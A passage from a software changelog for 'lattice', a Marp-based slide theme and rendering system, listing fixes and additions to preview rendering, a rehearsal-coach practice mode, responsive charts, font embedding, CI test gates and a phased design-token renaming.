  "Tools" group removed, so the mobile menu no longer stacks two near-identical
  navigations and Principles is no longer buried.
  **Fixed:** hand-written content links were hardcoded to the `/lattice/` base,
  so they 404'd on the Cloudflare (root-base) deployment. Content now uses
  base-less root-relative links and a `rehype-base-links` plugin prefixes the
  active base at build, so they resolve under both deploy targets; a branded,
  navigable **404** page replaces the dead-end. **Card icon tiles** keep their
  distinct per-card colours, but now drawn from each palette's own curated
  categorical series (`--chart-cat1…8`, tuned per palette AND light/dark, newly
  exposed to the docs) instead of Starlight's fixed rainbow — so they stay
  distinct yet on-palette with AA contrast in every theme and mode.

- **The CI visual-correctness gate is now a per-component semantic-invariant
  suite** (delivering the P4 pivot away from the retired pixel gate). Every
  component's example renders through the real emulator and is asserted on the
  *meaning* of its DOM, not its pixels — required slots resolve, no overflow,
  headings meet WCAG AA contrast, and transforming components render their real
  output (a chart's list → an `.chart-body` frame, glossary → a `<table>`, etc.).
  53 components, deterministic and machine-independent (no cross-runner flakiness),
  runs in the integration tier. See
  `engineering/decisions/2026-06-12-p4-regression-gate-retire-marp.md` §0.
- **The Drawing Board's Practice mode is now a real rehearsal coach.** It used to
  pace you against a word-count target and drop a one-word cue in the top bar.
  Now a **rehearsal planner** (`drawing-board-rehearsal.js`) turns the deck +
  your talk length into a per-slide plan — dwell time, a one-line *why*, and
  timed **coaching beats** (pause / look up for eye contact / breathe / signpost
  a section transition / emphasize) that surface at their moment over the slide.
  The plan is deterministic and instant by default (role + density heuristics,
  the proven floor, works offline); when a **capable** model is connected (cloud
  OpenRouter or a desktop WebLLM tier) it **auto-tailors** the pacing, rationale,
  and beats to *this* deck — reading a snippet of each slide's prose — memoised
  per deck-revision so an unchanged deck never re-bills and re-opening after an
  edit re-assesses. The cloud path honours the session **budget cap** and records
  spend in the tally, exactly like the chat; tiny/built-in tiers keep the proven
  floor rather than overriding it with weaker output. The start screen suggests a
  length from deck density and shows a **whole-deck read** — how the time splits
  (the ask %, the opening %), whether the deck fits the length, front-loading —
  recomputed live as you change the length (deterministic — opening it never
  bills). During the run, a **pace-aware "over time" nudge** surfaces once you
  linger past a slide's budget, keyed to your actual dwell. Guidance
  moved off the cramped top bar into a **single coaching pill on an unassuming
  gradient scrim** over the lower stage — it carries the slide's ambient guidance
  and becomes the timed beat at its moment — so the close button no longer shifts.
  And the stage now renders through the shared slide-box contract (`frame-css`),
  centring each slide exactly as the live preview does — fixing the slides that
  "rode high" — plus a no-zoom viewport that kills the iOS double-tap zoom. See
  `engineering/decisions/2026-06-08-architect-coach-features.md`.

- **Practice's running chrome is redesigned for legibility and stage room.** The
  top bar is now a pure **locator** — a per-slide progress **spine** that ticks
  each section boundary and names where you are (current section + position),
  with the **next section previewed** (`next · The ask`) so a transition never
  surprises you. All timing moved off the top into a composed **bottom HUD**: the
  clock is the dominant focal point, with pace and target grouped behind a
  hairline, balanced between Prev and Next. Pulling the clock and pace off the top
  edge hands that height back to the slide — the rehearsal stage is taller on
  every form factor. Responsive across desktop · tablet · mobile (the
  next-section preview drops on mobile to protect the width). See
  `engineering/decisions/2026-06-08-architect-coach-features.md`.

### Fixed

- **Practice's progress spine no longer barcodes — or breaks the layout — on a
  long deck.** The spine rendered one segment per slide with a fixed minimum
  width, so a 78-slide deck packed ~78 ticks past the viewport width; the
  overflow then widened the whole overlay and pushed the **Next** button off the
  right edge on a phone. It's now **one segment per section**, each sized to its
  slide count and filled left-to-right by your progress within it — a clean
  handful of bars at any deck size, and it can never widen the bar.

- **Practice slides no longer "ride high" on iOS.** The rehearsal stage centred
  each slide in a container sized with `100vh`, which inside an iframe on iOS
  Safari resolves to the *main* viewport rather than the iframe's box — so the
  slide centred against the wrong height and sat too high. The stage now fills
  its real container responsively (`height: 100%`) and the fit measures the
  iframe's own content box (`clientWidth/Height`) instead of viewport units, so a
  slide is centred identically on every browser. (The earlier "rode high" fix
  centred correctly on desktop but never reached iOS.)

- **Practice mode no longer mis-counts a `split: headings` (or fenced-`---`)
  deck as a single slide.** It re-implemented slide-splitting with a source
  regex that only knew about top-level `---`, so a deck the engine divides by
  heading collapsed to one giant slide — producing an absurd suggested length
  (e.g. "154 min for 1 slide") and a dead **Next** button. Practice now derives
  its slides from the engine's rendered `<section>` list (the authoritative
  segmentation, shared with the live preview), so the rehearsal plan, the
  whole-deck read, and navigation always match what the deck actually renders.
  The source split remains only as a fallback when the engine isn't ready.
- **The docs-site live preview no longer flickers, flashes, or leaves a dead
  scroll gap — and all four preview surfaces now share ONE controller.** The
  Playground, the Drawing Board, and both Workbench studios had each re-rolled the
  same "render → write iframe → scale every slide" routine and then drifted: only
  the Drawing Board had grown the visibility gate (anti first-paint flash) and the
  incremental section patch (anti per-keystroke reload flicker); the Playground
  and the two studios flashed (worst on the 4K jargon gallery, where un-scaled
  slides briefly painted at 3840px), flickered on every keystroke, left ~`SH·(1−scale)`
  of dead trailing scroll below the deck, and the studios weren't even size-aware
  (a `size: 4K` deck rendered 3× oversized). They now all run through one shared
  module (`docs/src/playground/deck-preview.js`, built on the unit-tested
  `preview-virtual.js` split kernel): a `.marpit` visibility gate revealed only
  once scaled, a height clamp that clips the last slide's un-scaled box tail,
  incremental patching of just the changed `<section>`s, and size-awareness
  everywhere. Short decks center in the preview (like the component specimens)
  while tall decks top-align and scroll (`justify-content: safe center`). The
  Drawing Board keeps its cursor↔slide sync, content-visibility virtualization,
  and PDF/PNG export unchanged.
- **Playground action bar fits a phone.** On narrow screens the truncated render
  status (a meaningless one-character sliver wedged between *Preview* and *Deck
  setup*) is hidden, and *Deck setup* / *Galleries* collapse to icon-only buttons
  (labels kept for screen readers and the desktop layout) so nothing overflows.
- **The keyed chart-family diagrams (`piechart`, `radar`, `quadrant`) are now
  responsive — they fill their box and scale with the available height instead
  of collapsing.** The pie disc was a fixed `32cqi` square (tied to slide
  *width*, blind to height), so any vertical squeeze — a masthead band under
  `islands: on`, a multi-line caption, or larger `finish: sketch` type —
  overflowed the flexed body and the slide's `overflow:hidden` clipped it to a
  half-ring; radar/quadrant under-filled and read inconsistently sized. Each
  diagram now fills its figure's OWN height (`height: 100cqh`, width via
  `aspect-ratio`) with **no per-chart max cap — the parent body is the only
  bound**, so they're a consistent size (radar no longer renders smaller than
  the pie) and shrink to a smaller FULL diagram under a squeeze. Axis/rim labels
  are SVG `<text>` in the viewBox, so they scale with the diagram. The HTML key
  stays a fixed `--fs-body-compact` (reliable proportional text scaling via
  `cqh` in `font-size` isn't achievable in CSS) — but because the diagram now
  shrinks under a squeeze, the freed room keeps the fixed key from truncating.
  (Surfaced by `gallery-jargon`'s `piechart donut` under `islands: on` — #229.)
- **`word-cloud` is responsive-safe under a vertical squeeze.** Its canvas was
  a fixed `85.9×25cqi` box (its absolutely-positioned children give it no
  in-flow size to shrink from); it now keeps that design size but caps at
  `max-width/max-height: 100%` of the flexed chart body, so a masthead band or
  tall caption scales the cloud + key + spine down together (the `wc-svg`
  viewBox `meet` letterboxes them) instead of risking overflow. With this, every
  chart-family graphic now fits its box: the fixed-aspect SVGs (`piechart`,
  `radar`, `quadrant`) fill their figure height, the wide SVGs (`funnel`, `map`,
  `word-cloud`) are width-bound, and the HTML+SVG charts fill width and flex. The
  shared keyed-chart key (the 70/30 rail) stays a fixed `--fs-body-compact` and
  no longer truncates, since the diagram shrinks under a squeeze to free the row.
- **Offline-rendered PDFs now embed the engine's intermediate font weights
  instead of synthesising them.** The self-hosted set the emulator base64-injects
  (`assets/fonts/` + `SELF_HOSTED_FACES`) was missing four faces the engine's
  `@import` actually requests — `Outfit 300/500/600` and `Shantell Sans 500` —
  so committed/offline PDFs faux-interpolated every `font-weight:300/500/600`
  body run (titles, `section strong`, meta/labels, sketch body) from the 400/700
  cuts. All 17 faces are now self-hosted on both PDF paths, matching what online
  renders already showed. A new **`fonts:check`** parity gate
  (`tools/check-fonts.js`, run by `build:check` and pre-commit) fails the build
  if the `@import` demand and the two offline supplies (the emulator's
  `SELF_HOSTED_FACES` + `assets/fonts/`, and the Drawing Board export's
  `font-embed.js`) ever drift again — closing the silent-font-fallback class of
  bug that the `finish: sketch` body-drop first surfaced.
- **Jargon gallery — closing-accent slide no longer overflows.** The final
  `closing accent` slide ran its body off the top and bottom of the frame (the
  "very thorough" punchline was clipped) in the default boardroom render; its
  body is trimmed to fit while keeping the joke. Same pass trimmed copy on a few
  slides that only overflowed under `finish: sketch` (`featured mirror`,
  `image full`, the `cards-grid compact` heading) and removed two zero-coverage
  appendix duplicates (the portrait `image full dark` stress-test slide that
  admitted it had "never been used in a real deck", and the `image left` slide
  that rendered pixel-identically to its `image mirror` alias) — 80 → 78 slides.
  Filed `engineering/decisions/2026-06-13-islands-sketch-density-collisions.md`
  documenting the broader islands/sketch chrome-reservation collisions the audit
  surfaced (not yet fixed; `islands: off` is the current workaround for dense
  decks).
- **The `lib/engine` render path now produces the full islands model** — the
  `islands:` toggle, the masthead `meta:` island, the footer progress-rail, and
  the section watermark. The engine only resolved the masthead band before, so
  `islands` decks rendered through the engine (the emulator after the P2 flip,
  and the Drawing Board / playground) lost their meta/progress/watermark islands.
  The toggle now runs before the transformer registry (so masthead-lift sees the
  `islands` class) and the three injectors run after, matching marp.config.js's
  render-hook order exactly.
- **`featured` and `compare-code` layouts now render under marp-cli and the
  marp-vscode preview, not just the emulator.** Both transforms — the featured
  hero/sub-card grid and the compare-code two-column structure — were bespoke to
  the emulator's `parseSlide`, so the marp-cli render path and the runtime emitted
  a plain `<ul>` (featured) or a flat `<p><code>`/`<pre>` sequence (compare-code).
  Migrated into the shared transformer registry (`lib/transformers/featured.js`,
  `compare-code.js`, with kernels in each component folder), so all three render
  paths agree. Emulator default output is byte-identical; engine↔marp parity holds.
- **Body copy now scales with the slide in every preview — it no longer
  collapses to a fixed ~10px (tiny on a 4K slide) while headings scaled.** The
  `--fs-*` typography tokens were the one family of section-OWN `cqi` properties
  never wired into the `--_sec-1cqi` hook that padding and the accent border
  already used. `section{container-type:size}` forbids the section from querying
  its own `cqi`, so its `font-size:var(--fs-body)` — which every gfm body element
  (`p`, `ul/li`, `td`, `blockquote`, …) inherits — fell back to the ICB; that's
  the slide only on the canonical emulator/print path (viewport = slide), but in
  an iframe/VS Code preview the ICB is the editor pane, so body text rendered
  pane-relative and shrank to a third of its size on a 4K slide. The `--fs-*`
  tokens now route through `var(--_sec-1cqi, 1cqi)` (`base.tokens.css`), so the
  docs-site preview/export AND the VS Code preview all render body copy at the
  intended size, while the `1cqi` fallback keeps the canonical/print render
  byte-identical. Headings were always correct (they're children, not
  section-own). The same root cause hit a handful of section-OWN **spacing**
  properties — chart-frame's footer safe-band, KPI's header-clearance padding,
  math/redline/citation grid gaps — so the `--sp-*` scale was given the same
  treatment (and the three remaining bare-`cqi` section-own literals —
  `chart-frame` padding, `citation-card.margin` columns, `accent` border —
  were wrapped too), closing the whole class. Affects rendering only; no
  authoring change, and the canonical/print render is byte-for-byte unchanged
  (verified by pixel-diff across the KPI + chart galleries).
- **`size: 4K` decks now preview and export correctly in the docs-site Drawing
  Board and Playground — they no longer render ~3× oversized, and PDF/PPTX
  export the full slide instead of a cropped corner.** The owned engine resolves
  the deck's
  `@size` geometry correctly (a 4K deck is a real 3840×2160 box), but every
  browser host that scales and exports the slide hardcoded HD: the preview
  fit-scaled by `w / 1280` (so a 3840-wide slide overflowed 3×) and the image
  exporters captured a 1280×720 crop onto a 1280×720 page (the top-left ninth of
  a 4K slide). The render now reports its resolved box (`render()` →
  `{ html, css, width, height }`), and the preview fit (Drawing Board +
  Playground), virtualization placeholder, print page, and export page/raster
  size all derive from it — so a
  4K deck previews identically to HD (same 16:9, just fit-scaled) and exports at
  native 4K. A `size:` edit now also forces a full preview rebuild (the box is
  baked into the iframe). Also fixed: image-PDF/PPTX content slides no longer
  show a full-slide rainbow fill — html-to-image mis-rendered the spectrum
  ribbon's gradient `border-image` as a whole-element fill, so the ribbon is now
  repainted as a thin top background strip during rasterization. Docs-only; the
  published engine and the marp-cli PDF path (which already sized 4K from the
  Puppeteer viewport) are unchanged.
- **The docs-site live preview now loads the sketch hand fonts — `finish:
  sketch` decks no longer render hand headings over a clean-sans body.** Each
  preview slide renders into an `srcdoc` iframe whose `<style>` concatenates the
  frame CSS before the theme CSS, which demoted the engine's Google-Fonts
  `@import` past the first-rule position where CSS honors it — so the iframe
  registered none of its own webfonts and showed only the faces the parent docs
  page happened to load (Playfair/Outfit/JetBrains). Caveat/Shantell were absent,
  so sketch headings fell to a system hand font (still hand-looking) while body
  fell to a system sans. The preview now registers the vendored faces directly
  (`previewFontFaceCss()` → `data.previewFontCss` for the Drawing Board's
  `writeFrame`; a lazy import in the shared single-slide renderer
  (`docs/src/lib/single-slide-render.ts`) for the landing hero, restyle and
  field-card islands, and the component specimens). Docs-only.
- **Drawing Board PDF / PowerPoint exports now embed every web font — body
  text on `finish: sketch` decks no longer drops to a system fallback.** The
  image exporters rasterize every slide through html-to-image, which chased the
  engine CSS's cross-origin Google-Fonts `@import` and lost a lazy-load race:
  Marp's template loads each face only for the active slide, so a font first
  needed by an off-screen slide (notably the Shantell Sans **body** face of a
  sketch deck) hadn't finished loading when its slide rasterized, and that slide
  fell back to a clean sans (headings kept Caveat only because a bookend slide
  was active). The export now vendors every engine text face (latin subset,
  Noto Color Emoji excluded) and hands html-to-image a precomputed data-URI
  `fontEmbedCSS`, so each rasterized slide is self-contained and all fonts embed
  deterministically. Affects PDF and PPTX (shared rasterizer); the vector
  `Print` path was never affected. Docs-only; the published engine and its
  Google-Fonts `@import` are unchanged.

### Changed

- **The four keyed charts (`piechart`, `radar`, `map`, cohort `quadrant`) now
  have SVG-native legends + spines — each chart is one self-contained, uniformly
  scaling unit.** The diagram, gradient divider spine, and key now share a single
  `<svg>` viewBox instead of a CSS 70/30 grid with an HTML legend, emitted by a
  shared builder (`svg-legend.js`) so all four read as **one family**. The whole
  chart scales as one with the container (no `cqh`-in-`font-size` drift): the key
  grows on `cover`, shrinks proportionally under a squeeze. The legend font is a
  **fixed ratio of the diagram height**, so the key renders at the **same physical
  size on every chart** regardless of each diagram's own viewBox; a pathological
  long-tail key grows the **viewBox height** so the whole unit scales down
  together (the 11-slice pie no longer clips). Labels **wrap fully — no
  ellipsis**; the swatch centres on the first line; every colour stays on palette
  tokens, and the labels route through `--font-label` so the `sketch` finish still
  reskins them in the hand sans. The map's swatches mirror its region fills
  (highlight hue / choropleth ramp), with group headings and a hollow `?` chip for
  unmatched names; radar/cohort reference series keep a quiet swatch. The key text
  is re-stated in an SVG `<desc>` so screen readers still hear the names + values
  (the chart is one `role="img"`). See
  `engineering/decisions/2026-06-13-svg-native-legend.md`.
- **PR reviews now get an inline before/after of any intended visual change.** A
  non-gating `golden-diff` CI job diffs THIS PR's committed gallery goldens
  against the base branch, rasterizes only the slides that *visually* changed (the
  pixel-diff filters out PDF byte-churn, so a rebuild-only golden reads as "no
  visual change"), and posts a sticky PR comment with the before │ after │ overlay
  montages embedded **inline** (hosted on the orphan `ci-drift-images` branch; the
  full set also uploads as the `golden-diff-changes` artifact). It compares two
  *committed* PDFs on one runner, so it's deterministic — unlike the pixel gate
  below.
- **The pixel-regression gate was _not_ adopted as a CI gate — P4 pivoted to
  per-component semantic invariants.** `npm run regress` (fresh render == committed
  golden) ships as a **local** spot-check only: across GitHub's runners Skia's
  CPU-dispatched rasterization isn't bit-identical (it flaked ~0.4–2% on a
  *different* gallery each CI run), and post-marp a self-golden pixel gate measures
  *change*, not *correctness*. The CI visual-correctness gate becomes the
  semantic-invariant suite (render via `lib/engine` → assert computed-style /
  structure; deterministic + machine-independent). See
  `engineering/decisions/2026-06-12-p4-regression-gate-retire-marp.md` §0.
- **The emulator (the `lattice` CLI / shipped `bin`) now renders through the
  owned `lib/engine` — one markdown implementation, the same engine that powers
  the marp-cli path.** The bespoke `parseSlide` regex parser the emulator shipped
  with is retired; the `LATTICE_EMULATOR_ENGINE` opt-in flag is gone (the engine
  is the only path). The swap was gated to **zero regressions** by a full-corpus
  per-page render A/B harness: every deck renders the same or better. The one
  visible render change is a **GFM-correctness improvement** — bold/emphasis
  markers inside inline code (`` `**x**` ``) now stay literal instead of being
  parsed as `<strong>`, matching CommonMark + the marp-cli path. Math (KaTeX) and
  syntax highlighting are handled by the engine; the deck-logo + island injectors
  still run in the emulator (they key off `data-lattice-slide`, stamped after the
  engine renders). See
  `engineering/decisions/2026-06-11-emulator-on-engine-p2.md` (P2 step d).
- **The reference trio's chart palettes are re-tuned to the quality bar they
  set.** `cuoio`, `indaco`, and `onyx` previously sat at grade C/C/B on
  `npm run scorecard` — the brand-triad curation that gives them tight brand
  affinity also clustered their categorical hues, which the scorecard penalises.
  Surgical, identity-preserving nudges (categorical pigments held to ΔE ≤ 0.05;
  chart-only `info`/`mute` free; semantic trios left untouched) lift all three to
  **B** (cuoio 83.6, indaco 85.2, onyx 89.2) with the hard chart-contrast gate
  still green. The standout fix: **onyx's `at-risk` gantt/kanban state was olive,
  nearly indistinguishable from its green `done`/`live`** — it's now a proper
  amber, so a blocked-but-on-track bar finally reads as a warning. onyx stays
  achromatic (its category grays are chroma-locked); indaco's change is
  imperceptible; cuoio's charts read a touch more vivid (more categorical
  separation). The previously-curated values remain in git history.
- **The `sketch` finish now hand-draws the metadata pills / badges too.** The
  shared `--pill-radius` (a machine-perfect `999px` lozenge) becomes a wobbled
  hand-drawn chip corner under `sketch`, so every metadata pill, state-marker
  chip, and label badge rides the hand like the cards around it (their text was
  already on the hand face). One token override; no per-component selectors.
- **Playground / Drawing Board now render via the owned `lattice-engine` by
  default** (HTML + the owned CSS emitter), with marp-core demoted to the
  `?engine=marp` / `?css=marp` escape hatch and live A/B oracle. The owned path
  reached full pixel parity with marp-core across the gallery corpus + the 89pp
  baseline and renders ~2.6× faster. The default `renderEngine` workspace pref and
  the playground module both flip to `lattice`. marp-core stays bundled for now;
  removing it is a later phase. (Docs-site only; the PDF/build path is unchanged.)
  - **Fix (dark mode):** the owned CSS emitter only resolved `@import 'lattice'`,
    so every `*-dark` theme — a thin wrapper (`@import '<base>'; :root{color-scheme:
    dark}`) — collapsed to a scaffold-only ~2 KB sheet (no tokens), rendering dark
    slides as unstyled near-black. The theme store now resolves theme-to-theme
    `@import 'name'` recursively against the registered themes, so all 13 dark
    wrappers inline their base palette + the lattice base. Guarded by a real-theme
    sweep in `test/unit/engine/engine.test.js`.

### Added

- **Workbench component bridge — local components reach the Drawing Board.** A
  CSS-only component authored and saved in the Workbench Layout Studio is now
  usable in the Drawing Board: it completes inside `_class:` (and offers its saved
  skeleton) marked *local*, renders live the moment a slide opts into its class,
  and **every Markdown export vendors only the components the deck references** as
  self-contained `<style>` blocks — so the exported `.md` renders the component
  across all three engine paths (marp-cli / emulator / runtime), not just in the
  browser. PDF / PPTX / Print already rasterize the live preview. Detection is one
  pure scan of the deck's `_class` directives that feeds both live render and
  export, so they can't drift. The Layout Studio blocks a local name that collides
  with a shipped component class at save time. CSS-only only; transform-bearing
  components remain graduation-only. See
  `engineering/decisions/2026-06-12-workbench-component-bridge.md`.
- **`islands: true` deck-wide toggle.** One front-matter flag enables the whole
  islands model across a deck — it resolves to the per-slide `islands` class on
  every eligible section, so the masthead band, bay (meta + status), progress
  rail, and watermarks just appear without tagging each slide. Bookends
  (`title` / `divider` / `closing`), the title-grid layouts (`math` /
  `compare-code`), the sovereign split layouts, and imagery are skipped
  automatically; a single slide opts out with `no-islands`. Applied in both
  server render paths (marp-cli + emulator) via one shared eligibility helper;
  build-time only, like the deck-wide `class:` / `logo:` directives (use a
  per-slide `islands` token in the marp-vscode preview). See `examples/islands.md`.
- **`islands:` deck-wide toggle (`off` / `on` / `minimal`).** One front-matter
  flag enables the islands model across a deck — it resolves to the per-slide
  `islands` class on every eligible section, so the masthead band, bay (meta +
  status), and progress rail just appear without tagging each slide. `on`
  (also `true`) is the full model; `minimal` keeps the band + bay but drops the
  progress rail (adds `no-progress`); `off` (also `false`, the default) is
  disabled. Bookends (`title` / `divider` / `closing`), the title-grid layouts
  (`math` / `compare-code`), the sovereign split layouts, and imagery are
  skipped automatically; a single slide opts out with `no-islands`. Applied in
  both server render paths (marp-cli + emulator) via one shared eligibility
  helper; build-time only, like the deck-wide `class:` / `logo:` directives.
  Surfaced in the Drawing Board **Deck setup** drawer (a three-way select) and
  in editor **autocomplete** (`off` / `on` / `minimal` after `islands:`). See
  `examples/islands.md`.
- **Watermark island (islands model, Phase 2c).** Add `watermark` to an
  `islands` slide and a large, palette-blind ghost of the current section
  number paints behind the content (z-behind, clipped by the section) —
  reinforcing the orientation the progress rail provides. Reuses the same
  divider-derived section model; no-op without dividers. Completes the five
  bay/footer/atmosphere islands of the model.
- **Progress island + island gap/clip contract (islands model, Phase 2b).** On
  `islands` slides, a footer-centre dot-rail orients the audience: it derives
  sections from the deck's `divider` slides and stamps one dot per section
  (current elongated + accented, labelled with the divider title) into every
  islands slide within a section — across all three render paths; absent when
  the deck has no dividers; opt out with `no-progress`. Islands now also keep
  a **defined gap** to their neighbours (a footer safe-area reserve) and
  **clip their own overflow**, so poorly-fitting content is cut at the berth
  rather than bleeding across islands.
- **Masthead-bay islands — `meta:` + re-docked status (islands model, Phase 2).**
  The reserved masthead bay (Phase 1) now carries two islands on `islands`
  slides. A new deck-wide `meta:` front-matter directive (date · owner ·
  classification; ` | ` splits into stacked lines) injects a `.isl-meta`
  island into the bay across all three render paths. And the label-type state
  markers (`confidential` · `wip` · `draft`) re-dock from their corner
  stamp / full-width band into a clean bay chip when combined with `islands`
  (their default treatment is unchanged without it). See `examples/islands.md`.
- **`islands` modifier — the masthead band (islands model, Phase 1).** Opt in
  with `<!-- _class: <layout> islands -->` and the slide's eyebrow + title lift
  out of content flow into a named `.isl-masthead` band (hairline rule + a
  reserved right bay for the meta/logo/status islands coming in Phase 2). The
  body stays a direct child of the section, so components compose unchanged.
  Wired through all three render paths via the shared transformer registry;
  incompatible with `math` / `compare-code` (they drive their own title grid).
  See `engineering/decisions/2026-06-11-islands.md` and `examples/islands.md`.
- **Universal token system — phase 1 (categorical vocabulary).** The overloaded
  `--cN-light` / `--cN-dark` categorical pair gains a self-describing, foreground/
  background-explicit vocabulary: `--cat-N-fill` (pale categorical surface),
  `--cat-N-mark` (saturated stroke / mark / cScale feed), `--cat-on-fill` /
  `--cat-on-mark` (ink for text placed on each). Where the old `-light` / `-dark`
  suffix named a *tier* yet collided with the color-scheme meaning of `--dark-*`
  and the `light-dark()` function, the new names say exactly what a token is and
  where it goes — color-scheme now lives only inside the `light-dark()` value.
  Phase 1 aliases new→old, so values are **byte-identical** (zero visual change;
  all 14 hand-audited / AA-tested palettes untouched) and every existing consumer
  (`mermaid.css`, the chart transforms) keeps resolving through the old names
  while the three render paths' Mermaid bridges read the new names. The emulator's
  offline palette resolver is upgraded to a real recursive evaluator
  (`lib/core/resolve-token-expr.js`: `var()`+fallback, `light-dark()`,
  `color-mix()` in oklab/srgb), the offline twin of `getComputedStyle`, so a
  bridge token may now hold any expression the three paths share. Design,
  crosswalk, and the remaining phases:
  `engineering/decisions/2026-06-11-universal-token-system.md`.
- **Universal token system — phase 2 (diagram-structural).** The structural
  foregrounds move off the overloaded `--c-` junk-drawer prefix onto the
  `--diagram-` group: `--diagram-stroke` (band borders, was `--c-stroke`),
  `--diagram-line` (edges / arrows / connectors, was `--c-line`), and
  `--diagram-accent-warm` (radar's second curve, was `--c-accent-warm`).
  Aliased new→old (byte-identical); the three render paths' Mermaid bridges
  read the new names while `mermaid.css`'s ~90 SVG rules and the radar override
  keep the old names via the alias and migrate later. Demo deck:
  `examples/universal-tokens-p2-structural.md`.
- **Universal token system — phase 3 (status + diagram lifecycle).** The three
  tangled "status" systems resolve into **two honest axes**. (1) A single STATUS
  vocabulary `--status-{pass,warn,fail,info,mute}` shared by the engine
  state-discs and the charts (`--pass/warn/fail` alias to it; info/mute borrow
  the chart family's canonical semantic hues). (2) A *separate* diagram
  lifecycle/annotation axis renamed off `--c-warm/cool/alarm/mark/note` onto
  semantic names — `--diagram-active` / `--diagram-done` / `--diagram-critical`
  (+ paired `-mark` strokes), `--diagram-today`, `--diagram-note` — because a
  gantt "in-progress" tone is not a "warn". Aliased new→old (byte-identical);
  the lifecycle bridges (gantt / notes / error in both renderers) read the new
  names, `mermaid.css` keeps the old via the alias. Demo deck:
  `examples/universal-tokens-p3-status.md`.
- **Universal token system — phase 4 (surfaces / scheme).** Fixes the P9
  collision where `--bg-dark` (a dark *panel* on a light deck — title / divider /
  closing / split rails / code) sat one keystroke from `--dark-bg` (the canvas
  in dark *mode*), opposite roles. `--bg-dark` → `--surface-inverse` (its 8
  component/integration consumers repointed, byte-identical); the `--dark-*`
  color-scheme inputs gain `--scheme-dark-*` names (vocabulary now; the per-theme
  `light-dark()` pairs flip later). `--bg` / `--bg-alt` / `--border` are kept
  as-is — clear and short, not magic. Demo deck:
  `examples/universal-tokens-p4-surfaces.md`.
- **Universal token system — phase 5 (sequential ramp).** Fixes the P8
  collision where "scale" meant two unrelated things — the ordered colour ramp
  `--scale-50…900` *and* the typographic multiplier `--fs-scale`. The ramp is
  renamed to the unambiguous `--seq-50…900` (sequential / quantitative
  encoding). Aliased to the existing stops (byte-identical); the sole consumer
  (the word-cloud heat-ramp) repoints to `--seq-*`, the `--scale-*` anchor +
  derivation stay as the source until the flip. `--fs-scale` is untouched and
  now the only "scale" left. Demo deck:
  `examples/universal-tokens-p5-sequential.md`.
- **Universal token system — phase 6 (chart categorical).** The chart-family
  colour spectrum moves off the bare `--cat1-{hue,fill,ink}` … `--cat8-*` — which
  sat one hyphen from phase 1's diagram `--cat-1-*` — onto its own namespaced
  `--chart-cat-1-{hue,fill,ink}` … `--chart-cat-8-*`. Unlike the earlier phases
  this is a **flip, not an alias**: the bare `cat` name is eliminated entirely
  (the spectrum is self-contained in the chart CSS + transforms, not bridge-fed),
  so the near-collision is gone rather than merely deprecated. Values are
  byte-identical; the theme override hooks `--chart-catN` are unchanged. The two
  categorical systems stay distinct by design (12 diagram band slots vs 8 chart
  slots — Wong 2011), now with names that say which is which. Demo deck:
  `examples/universal-tokens-p6-chart-cat.md`.
- **Universal token system — phase 7 (self-policing gate).** Adds
  `test/unit/palette/universal-token-vocabulary.test.js` — a CI gate that fails
  the build if any phase's vocabulary (`--cat-*`, `--diagram-*`, `--status-*`,
  `--surface-inverse`, `--scheme-dark-*`, `--seq-*`) is left undefined or its
  alias dropped, so the system stays honest going forward. The originally
  planned "move component knobs out of `:root`" is **reclassified, not
  executed**: investigation showed `--chart-fill-*` is already component-scoped
  and `--pill-*` / `--mark-*` / the state-disc knobs are genuine *universal
  component primitives* (consumed by `base.modifiers` + 10+ components) that
  correctly live in base — nothing to relocate. Capstone demo deck:
  `examples/universal-tokens-p7-system.md`. The remaining work (the canonical
  flip off the old names + the post-flip name lint) is documented in the
  decision note.
- **Workbench export bridge — library themes reach the Drawing Board.** A theme
  saved in the Workbench library is now selectable in the Drawing Board's palette
  picker (listed with a *(saved)* suffix), registers with the in-browser engine,
  and renders live — light *and* dark, resolved from its single `light-dark()`
  file. The choice persists in the deck's `theme:` front matter like any palette,
  and every export carries it: **Markdown** embeds the theme's CSS self-contained
  (so a re-import or a lattice-configured `marp-cli` run keeps the palette without
  installing the theme), while PDF / PPTX / Print already rasterize the themed
  preview. Components remain a follow-on slice. See
  `engineering/decisions/2026-06-11-workbench-export-bridge.md`.
- **Theme token parity — all 13 palettes are now fully self-curated.** Every
  shipped theme now defines its own chart-family palette (`--chart-cat1..8` +
  `--chart-state-*`) and its own semantic signal trio (`--pass` / `--warn` /
  `--fail`), tuned to the palette and AA-verified on both canvases, instead of
  leaning on the engine fallback. `carbone` gained the 12-slot `--c1..12`
  Mermaid band scale it was missing (which had left its corner tags and
  diagram fills undefined). The previously-curated `cuoio` / `indaco` / `onyx`
  remain the reference. A new `npm run scorecard` grades every theme on token
  completeness + palette quality, `npm run scorecard:check` and
  `test/unit/palette/token-parity.test.js` gate that no palette falls back to
  the lattice cascade for a contract token, and `chart-contrast.test.js` now
  gates the chart palette of all 13 (was 3).
- **Authoring validator catches two more inline-bold footguns.** The shared
  lint engine (`lib/authoring/lint-core.js` — used by the `lint:deck` CLI, the
  manifest `validate()` gate, and the Drawing Board / coach Architect panel) now
  flags: (1) the **ordered** flavour of the card-style footgun
  (`1. **Title.** body` on `cards-grid`/`cards-stack`/etc., not just the
  unordered `- **Title.** body`), and (2) a new `ledger-inline-title` rule for
  **ledger/numbered** layouts (`list-tabular`, `agenda`, `kpi`, `stats`,
  `list-criteria`, `list-steps`, `timeline-list`, `state-chart`,
  `authority-chain`, `regulatory-update`) authored as an unordered bold lead-in
  (`- **Name.** value`) instead of the numbered ledger shape (`1. Name` /
  `   - value`). These were the gaps that let broken authoring through the
  commit gate and out of the coach. Existing decks/manifests/docs were swept
  clean to satisfy the stricter rules.

- **Playground — "Load a deck" drawer.** The playground's ⚙ insert menu is now a
  slide-in **Galleries** drawer (a labeled grid-icon button, not a gear, so its
  function reads as "browse + load a full deck"). It lists the repo's showcase
  decks — **Jargon** and the **Design system** tour under *Showcases*, plus one
  survey deck per component family (Anchors → Legal) under *By family* — each
  with a slide count. Picking one drops the whole deck into the editor and renders
  it live in the chosen palette. The demoted per-component scaffold actions (reset
  to example / blank skeleton) move into the drawer's *This component* section.
  Local image assets in the loaded decks are inlined as data URIs at build time so
  they render in the sandboxed preview. Docs-site only.
- **Drawing Board — Deck setup drawer.** A new config button in the editor toolbar
  (beside Export — front matter is a document-level setting) opens a slide-in
  drawer for the deck's Marp front matter: theme, slide size
  (16:9 / 4K / 4:3), page numbers, running header & footer, plus a default slide
  class, math renderer (KaTeX / MathJax), and document language. The controls are
